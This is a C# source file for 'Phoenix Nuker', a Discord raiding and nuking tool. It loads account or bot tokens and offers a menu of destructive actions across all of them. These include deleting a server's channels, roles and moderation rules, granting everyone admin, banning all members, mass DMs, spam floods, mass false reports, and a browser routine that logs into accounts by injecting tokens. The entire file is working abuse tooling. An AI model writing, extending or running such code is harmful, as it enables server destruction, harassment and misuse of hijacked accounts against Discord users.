using System.Drawing;
using Console = Colorful.Console;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium;
using WebDriverManager;
using WebDriverManager.DriverConfigs.Impl;
using WebDriverManager.Helpers;

/* 
       │ Author       : extatent
       │ Name         : Phoenix-Nuker
       │ GitHub       : https://github.com/extatent
*/

namespace Phoenix
{
    class Program
    {
        #region Configuration
        static readonly List<string> tokenlist = new();
        static ulong? guildid;
        #endregion

        #region Write Logo
        static void WriteLogo()
        {
            Console.Clear();
            string phoenix = @"
                                  ██████╗ ██╗  ██╗ ██████╗ ███████╗███╗   ██╗██╗██╗  ██╗
                                  ██╔══██╗██║  ██║██╔═══██╗██╔════╝████╗  ██║██║╚██╗██╔╝
                                  ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║██║ ╚███╔╝ 
                                  ██╔═══╝ ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║██║ ██╔██╗ 
" + " > GitHub: github.com/extatent" + @"    ██║     ██║  ██║╚██████╔╝███████╗██║ ╚████║██║██╔╝ ██╗
                                  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
                                                      ";
            Console.WriteWithGradient(phoenix, Color.OrangeRed, Color.Yellow, 6);
            Console.WriteLine();
        }
        #endregion

        #region Main
        static void Main()
        {
            Console.Title = "Phoenix Nuker";
            Start();
        }
        #endregion

        #region Start
        static void Start()
        {
            try
            {
                Console.ForegroundColor = Color.Yellow;
                if (!File.Exists("tokens.txt"))
                    File.Create("tokens.txt").Dispose();

                var list = File.ReadAllLines("tokens.txt");
                int count = 0;
                foreach (var token in list)
                {
                    count++;
                    tokenlist.Add(token);
                    try { Request.SendGet("/users/@me", token); } catch { Config.IsBot = true; }
                }
                if (count == 0)
                {
                    WriteLogo();
                    Console.WriteLine("Paste your token(s) in tokens.txt file.");
                    Thread.Sleep(5000);
                    Environment.Exit(0);
                }
                Console.Title = $"Phoenix Nuker | Total Accounts: {count}";
                Options();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message + "\n\nPress any key to exit.");
                Console.ReadKey();
                Environment.Exit(0);
            }
        }
        #endregion

        #region Options
        static void Options()
        {
            try
            {
                WriteLogo();
                string options = @"
╔════════════════════════╦════════════════════════════════════════════════════════════╦═════════════════════╗
║ > Account Nuker        ║ > Server Nuker                                             ║ > MultiToken Raider ║
╠══╦═════════════════════╬══╦══════════════════════╦══╦═══════════════════════════════╬══╦══════════════════╣
║01║ Edit Profile        ║15║ Delete Roles         ║29║ Delete Stickers               ║43║ Join Guild/Group ║
║02║ Leave/Delete Guilds ║16║ Remove All Bans      ║30║ Grant Everyone Admin          ║44║ Leave Guild      ║
║03║ Clear Relationships ║17║ Delete All Channels  ║31║ Delete Auto Moderation Rules  ║45║ Add Friend       ║
║04║ Leave HypeSquad     ║18║ Delete All Emojis    ║32║ Mass Create Invites           ║46║ Spam             ║
║05║ Remove Connections  ║19║ Delete All Invites   ║33║ Delete Guild Scheduled Events ║47║ Add Reaction     ║
║06║ Deauthorize Apps    ║20║ Mass Create Roles    ║34║ Delete Guild Template         ║48║ Block User       ║
║07║ Mass Create Guilds  ║21║ Mass Create Channels ║35║ Delete Stage Instances        ║49║ DM User          ║
║08║ Seizure Mode        ║22║ Prune Members        ║36║ Delete All Webhooks           ║50║ Leave Group      ║
║09║ Confuse Mode        ║23║ Remove Integrations  ║37║ Webhook Spammer               ║51║ Trigger Typing   ║
║10║ Mass DM             ║24║ Remove All Reactions ║38║ Mass Report                   ║52║ Report Message   ║
║11║ User Info           ║25║ Guild Info           ║39║ Ban All Members               ║53║ Check Tokens     ║
║12║ Block Relationships ║26║ Leave/Delete Guild   ║40║ Kick All Members              ║54║ Exit             ║
║13║ Delete DMs          ║27║ Msg In Every Channel ║41║ Rename Everyone               ║55║                  ║
║14║ Login to Account    ║28║ Delete Webhook       ║42║ Change Guild ID               ║56║                  ║
╚══╩═════════════════════╩══╩══════════════════════╩══╩═══════════════════════════════╩══╩══════════════════╝
";

                Console.WriteWithGradient(options, Color.OrangeRed, Color.Yellow, 7);
                Console.ForegroundColor = Color.Yellow;
                Console.WriteLine();
                Console.Write("Your choice: ");
                int choice = int.Parse(Console.ReadLine());
                switch (choice)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        Thread.Sleep(2000);
                        Console.Clear();
                        Options();
                        break;
                    case 1:
                        WriteLogo();
                        string options2 = @"
╔══╦════════════╗
║##║ Name       ║
╠══╬════════════╣
║00║ None       ║
║01║ Bravery    ║
║02║ Brilliance ║
║03║ Balance    ║
╚══╩════════════╝
";
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write(options2);
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        string hypesquad = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Biography: ");
                        string bio = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Custom Status: ");
                        string status = Console.ReadLine();
                        WriteLogo();
                        foreach (var token in tokenlist) User.EditProfile(token, hypesquad, bio, status);
                        Options();
                        break;
                    case 2:
                        WriteLogo();
                        foreach (var token in tokenlist) User.LeaveDeleteGuilds(token);
                        Options();
                        break;
                    case 3:
                        WriteLogo();
                        foreach (var token in tokenlist) User.ClearRelationships(token);
                        Options();
                        break;
                    case 4:
                        WriteLogo();
                        foreach (var token in tokenlist) User.LeaveHypeSquad(token);
                        Options();
                        break;
                    case 5:
                        WriteLogo();
                        foreach (var token in tokenlist) User.RemoveConnections(token);
                        Options();
                        break;
                    case 6:
                        WriteLogo();
                        foreach (var token in tokenlist) User.DeauthorizeApps(token);
                        Options();
                        break;
                    case 7:
                        WriteLogo();
                        Console.Write("Guild name: ");
                        string name = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count (max 100): ");
                        int count = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int numb = 0;
                        for (int i = 0; i < count; i++)
                        {
                            numb++;
                            foreach (var token in tokenlist) User.CreateGuild(token, name);
                            Console.ReplaceAllColorsWithDefaults();
                            Console.WriteLine($"Created: {numb}", Color.Lime);
                        }
                        Options();
                        break;
                    case 8:
                        WriteLogo();
                        Console.Write("Count: ");
                        int count2 = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int numb2 = 0;
                        for (int i = 0; i < count2; i++)
                        {
                            numb2++;
                            foreach (var token in tokenlist)
                            {
                                User.ChangeTheme(token, "light");
                                User.ChangeTheme(token, "dark");
                            }
                            Console.ReplaceAllColorsWithDefaults();
                            Console.WriteLine($"Changed: {numb2}", Color.Lime);
                        }
                        Options();
                        break;
                    case 9:
                        WriteLogo();
                        foreach (var token in tokenlist) User.ConfuseMode(token);
                        Options();
                        break;
                    case 10:
                        WriteLogo();
                        Console.Write("Message: ");
                        string message = Console.ReadLine();
                        WriteLogo();
                        foreach (var token in tokenlist) User.MassDM(token, message);
                        Options();
                        break;
                    case 11:
                        WriteLogo();
                        foreach (var token in tokenlist) User.UserInformation(token);
                        Options();
                        break;
                    case 12:
                        WriteLogo();
                        foreach (var token in tokenlist) User.BlockRelationships(token);
                        Options();
                        break;
                    case 13:
                        WriteLogo();
                        foreach (var token in tokenlist) User.DeleteDMs(token);
                        Options();
                        break;
                    case 14:
                        WriteLogo();
                        SeleniumLogin();
                        Options();
                        break;
                    case 15:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.DeleteRoles(token, guildid);
                        Options();
                        break;
                    case 16:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.RemoveBans(token, guildid);
                        Options();
                        break;
                    case 17:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.DeleteChannels(token, guildid);
                        Options();
                        break;
                    case 18:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.DeleteEmojis(token, guildid);
                        Options();
                        break;
                    case 19:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.DeleteInvites(token, guildid);
                        Options();
                        break;
                    case 20:
                        GuildID();
                        WriteLogo();
                        Console.Write("Role name: ");
                        string name2 = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count (max 250): ");
                        int count3 = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int numb3 = 0;
                        for (int i = 0; i < count3; i++)
                        {
                            numb3++;
                            foreach (var token in tokenlist) Guild.CreateRole(token, guildid, name2);
                            Console.ReplaceAllColorsWithDefaults();
                            Console.WriteLine("Created: " + numb3, Color.Lime);
                        }
                        Options();
                        break;
                    case 21:
                        GuildID();
                        WriteLogo();
                        Console.Write("Channel name: ");
                        string name3 = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count (max 500): ");
                        int count4 = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int numb4 = 0;
                        for (int i = 0; i < count4; i++)
                        {
                            numb4++;
                            foreach (var token in tokenlist) Guild.CreateChannel(token, guildid, name3);
                            Console.ReplaceAllColorsWithDefaults();
                            Console.WriteLine("Created: " + numb4, Color.Lime);
                        }
                        Options();
                        break;
                    case 22:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.PruneMembers(token, guildid);
                        Options();
                        break;
                    case 23:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.RemoveIntegrations(token, guildid);
                        Options();
                        break;
                    case 24:
                        GuildID();
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message ID: ");
                        ulong? mid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.DeleteAllReactions(token, cid, mid);
                        Options();
                        break;
                    case 25:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.GuildInformation(token, guildid);
                        Options();
                        break;
                    case 26:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.LeaveDeleteGuild(token, guildid);
                        Options();
                        break;
                    case 27:
                        GuildID();
                        WriteLogo();
                        string options3 = @"
╔══╦═════════════╗
║##║ Name        ║
╠══╬═════════════╣
║01║ Spam        ║
║02║ One Message ║
╚══╩═════════════╝
";
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write(options3);
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        int choice2 = int.Parse(Console.ReadLine());
                        switch (choice2)
                        {
                            case 1:
                                WriteLogo();
                                Console.Write("Message: ");
                                string msg3 = Console.ReadLine();
                                WriteLogo();
                                Console.Write("Messages count: ");
                                int count7 = int.Parse(Console.ReadLine());
                                WriteLogo();
                                for (int i = 0; i < count7; i++)
                                    foreach (var token in tokenlist) Guild.MsgInEveryChannel(token, guildid, msg3);
                                break;
                            case 2:
                                WriteLogo();
                                Console.Write("Message: ");
                                string msg4 = Console.ReadLine();
                                WriteLogo();
                                foreach (var token in tokenlist) Guild.MsgInEveryChannel(token, guildid, msg4);
                                break;
                        }
                        Options();
                        break;
                    case 28:
                        GuildID();
                        WriteLogo();
                        Console.Write("Webhook URL/ID: ");
                        string? webhook = Console.ReadLine();
                        webhook = webhook.Replace("https://discord.com/api/webhooks/", "");
                        ulong? wid = ulong.Parse(webhook.Split('/')[0]);
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.DeleteWebhook(token, wid);
                        Console.WriteLine("Done");
                        Options();
                        break;
                    case 29:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.DeleteStickers(token, guildid);
                        Options();
                        break;
                    case 30:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.GrantEveryoneAdmin(token, guildid);
                        Options();
                        break;
                    case 31:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.DeleteAutoModerationRules(token, guildid);
                        Options();
                        break;
                    case 32:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.CreateInvite(token, guildid);
                        Options();
                        break;
                    case 33:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.DeleteGuildScheduledEvents(token, guildid);
                        Options();
                        break;
                    case 34:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.DeleteGuildTemplate(token, guildid);
                        Options();
                        break;
                    case 35:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.DeleteStageInstances(token, guildid);
                        Options();
                        break;
                    case 36:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Guild.DeleteWebhooks(token, guildid);
                        Options();
                        break;
                    case 37:
                        GuildID();
                        WriteLogo();
                        Console.Write("Webhook URL: ");
                        string webhook2 = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Message: ");
                        string message2 = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count: ");
                        int mcount = int.Parse(Console.ReadLine());
                        WriteLogo();
                        webhook2 = webhook2.Replace("https://discord.com/api/webhooks/", "");
                        ulong? wid2 = ulong.Parse(webhook2.Split('/')[0]);
                        string wtoken = webhook2.Split('/')[1];
                        int total = 0;
                        for (int i = 0; i < mcount; i++)
                        {
                            total++;
                            foreach (var token in tokenlist) Guild.SendWebhookMessage(token, wid2, wtoken, message2);
                            Console.WriteLine("Messages sent: " + total);
                        }
                        Options();
                        break;
                    case 38:
                        GuildID();
                        WriteLogo();
                        Console.Write("Guild ID: ");
                        ulong? gid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid2 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message ID: ");
                        ulong? mid2 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        string options4 = @"
╔══╦════════════════════════╗
║##║ Name                   ║
╠══╬════════════════════════╣
║01║ Illegal Content        ║
║02║ Harrassment            ║
║03║ Spam Or Phishing Links ║
║04║ Self Harm              ║
║05║ NSFW                   ║
╚══╩════════════════════════╝
";
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write(options4);
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        int reason = int.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Reports count: ");
                        int count5 = int.Parse(Console.ReadLine());
                        WriteLogo();
                        int reports = 0;
                        for (int i = 0; i < count5; i++)
                        {
                            foreach (var token in tokenlist) Guild.ReportMessage(token, gid, cid2, mid2, reason);
                            reports++;
                            Console.WriteLine("Reports sent: " + reports);
                        }
                        Options();
                        break;
                    case 39:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Bot.BanAllMembers(token, guildid);
                        Options();
                        break;
                    case 40:
                        GuildID();
                        WriteLogo();
                        foreach (var token in tokenlist) Bot.KickAllMembers(token, guildid);
                        Options();
                        break;
                    case 41:
                        GuildID();
                        WriteLogo();
                        Console.Write("Nickname: ");
                        string nick = Console.ReadLine();
                        WriteLogo();
                        foreach (var token in tokenlist) Bot.ChangeAllNicknames(token, guildid, nick);
                        Options();
                        break;
                    case 42:
                        GuildID();
                        Options();
                        break;
                    case 43:
                        WriteLogo();
                        Console.WriteLine("If your tokens isn't phone verified, Discord may lock them.\n");
                        Console.Write("Invite code: ");
                        string code = Console.ReadLine();
                        if (code.Contains("https://discord.gg/"))
                            code = code.Replace("https://discord.gg/", "");
                        if (code.Contains("https://discord.com/invite/"))
                            code = code.Replace("https://discord.com/invite/", "");
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.JoinGuild(token, code);
                        Options();
                        break;
                    case 44:
                        WriteLogo();
                        Console.Write("Guild ID: ");
                        ulong? id = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.LeaveGuild(token, id);
                        Options();
                        break;
                    case 45:
                        WriteLogo();
                        Console.Write("Full Username: ");
                        string full = Console.ReadLine();
                        string user = full.Split('#')[0];
                        uint discriminator = uint.Parse(full.Split('#')[1]);
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.AddFriend(token, user, discriminator);
                        Options();
                        break;
                    case 46:
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid3 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message: ");
                        string msg = Console.ReadLine();
                        WriteLogo();
                        Console.Write("Count: ");
                        int count6 = int.Parse(Console.ReadLine());
                        WriteLogo();
                        for (int i = 0; i < count6; i++)
                            foreach (var token in tokenlist) Raid.SendMessage(token, cid3, msg);
                        Options();
                        break;
                    case 47:
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid4 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message ID: ");
                        ulong? mid3 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        string options5 = @"
╔══╦═════════════════════════════════════════════════════════════════════╗
║##║ Name                                                                ║
╠══╬══════════════════════╦══╦═════════════════════════════╦══╦══════════╣
║01║ Heart                ║06║ Billed Cap                  ║11║ Skull    ║
║02║ White Check Mark     ║07║ Negative Squared Cross Mark ║12║ Clown    ║
║03║ Regional Indicator L ║08║ Neutral Face                ║13║ No Mouth ║
║04║ Regional Indicator W ║09║ Nerd Face                   ║14║ Sob      ║
║05║ Middle Finger        ║10║ Joy                         ║15║ Eggplant ║
╚══╩══════════════════════╩══╩═════════════════════════════╩══╩══════════╝
";
                        Dictionary<int, string> emojis = new()
                        {
                            {1, "❤️"},
                            {2, "✅"},
                            {3, "🇱"},
                            {4, "🇼"},
                            {5, "🖕"},
                            {6, "🧢"},
                            {7, "❎"},
                            {8, "😐"},
                            {9, "🤓"},
                            {10, "😂"},
                            {11, "💀"},
                            {12, "🤡"},
                            {13, "😶"},
                            {14, "😭"},
                            {15, "🍆"}
                        };

                        Console.ForegroundColor = Color.Yellow;
                        Console.Write(options5);
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        int choice3 = int.Parse(Console.ReadLine());
                        if (emojis.ContainsKey(choice3))
                            foreach (var token in tokenlist) Raid.AddReaction(token, cid4, mid3, emojis[choice3]);
                        Options();
                        break;
                    case 48:
                        WriteLogo();
                        Console.Write("User ID: ");
                        ulong? uid2 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.BlockUser(token, uid2);
                        Options();
                        break;
                    case 49:
                        WriteLogo();
                        Console.Write("User ID: ");
                        ulong? uid = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message: ");
                        string msg2 = Console.ReadLine();
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.DMUser(token, uid, msg2);
                        Options();
                        break;
                    case 50:
                        WriteLogo();
                        Console.Write("Group ID: ");
                        ulong? gid2 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.LeaveGroup(token, gid2);
                        Options();
                        break;
                    case 51:
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid5 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.TriggerTyping(token, cid5);
                        Options();
                        break;
                    case 52:
                        WriteLogo();
                        Console.Write("Guild ID: ");
                        ulong? gid3 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong? cid6 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        Console.Write("Message ID: ");
                        ulong? mid4 = ulong.Parse(Console.ReadLine());
                        WriteLogo();
                        string options6 = @"
╔══╦════════════════════════╗
║##║ Name                   ║
╠══╬════════════════════════╣
║01║ Illegal Content        ║
║02║ Harrassment            ║
║03║ Spam Or Phishing Links ║
║04║ Self Harm              ║
║05║ NSFW                   ║
╚══╩════════════════════════╝
";
                        Console.ForegroundColor = Color.Yellow;
                        Console.Write(options6);
                        Console.WriteLine();
                        Console.Write("Your choice: ");
                        int reason2 = int.Parse(Console.ReadLine());
                        WriteLogo();
                        foreach (var token in tokenlist) Raid.ReportMessage(token, gid3, cid6, mid4, reason2);
                        Options();
                        break;
                    case 53:
                        WriteLogo();
                        Console.ReplaceAllColorsWithDefaults();
                        foreach (var token in tokenlist)
                        {
                            try
                            {
                                Request.SendGet("/users/@me", token);
                                Console.WriteLine(token, Color.Lime);
                                File.AppendAllText("WorkingTokens.txt", token + Environment.NewLine);
                            }
                            catch { Console.WriteLine(token, Color.Red); }
                            Thread.Sleep(200);
                        }
                        Console.ForegroundColor = Color.Yellow;
                        Console.WriteLine("Working tokens were saved to WorkingTokens.txt");
                        Thread.Sleep(3000);
                        Options();
                        break;
                    case 54:
                        Environment.Exit(0);
                        break;
                    case 55:
                        WriteLogo();
                        Options();
                        break;
                    case 56:
                        WriteLogo();
                        Options();
                        break;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Thread.Sleep(3000);
                Options();
            }
        }
        #endregion

        #region Guild ID
        static void GuildID()
        {
            if (guildid == null)
            {
                try
                {
                    Console.Clear();
                    WriteLogo();
                    Console.ForegroundColor = Color.Yellow;
                    Console.WriteLine();
                    Console.Write("Guild ID: ");
                    guildid = ulong.Parse(Console.ReadLine());
                    foreach (var token in tokenlist)
                    {
                        if (Guild.GetGuildName(token, guildid) == "N/A")
                        {
                            WriteLogo();
                            Console.WriteLine("Invalid ID or you're not in the guild.");
                            guildid = ulong.Parse("");
                            Thread.Sleep(3000);
                            Options();
                        }
                    }
                    Console.Clear();
                }
                catch { }
            }
        }
        #endregion

        #region Selenium Login
        static void SeleniumLogin()
        {
            try
            {
                new DriverManager().SetUpDriver(new ChromeConfig(), VersionResolveStrategy.MatchingBrowser);

                Console.WriteLine("Please wait");

                ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                service.EnableVerboseLogging = false;
                service.SuppressInitialDiagnosticInformation = true;
                service.HideCommandPromptWindow = true;

                ChromeOptions options = new();
                options.AddArguments(new string[] { "--disable-logging", "--mute-audio", "--disable-extensions", "--disable-notifications", "--disable-application-cache", "--no-sandbox", "--disable-crash-reporter", "--disable-dev-shm-usage", "--disable-gpu", "--ignore-certificate-errors", "--disable-infobars", "--silent" });

                IWebDriver driver = new ChromeDriver(service, options) { Url = "https://discord.com/login" };

                foreach (var token in tokenlist)
                {
                    IJavaScriptExecutor execute = (IJavaScriptExecutor)driver;
                    execute.ExecuteScript($"let token = \"{token}\"; function login(token) {{ setInterval(() => {{ document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"${{token}}\"` }}, 50); setTimeout(() => {{ location.reload(); }}, 2500); }} login(token);");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Thread.Sleep(3000);
                Options();
            }
        }
        #endregion
    }
}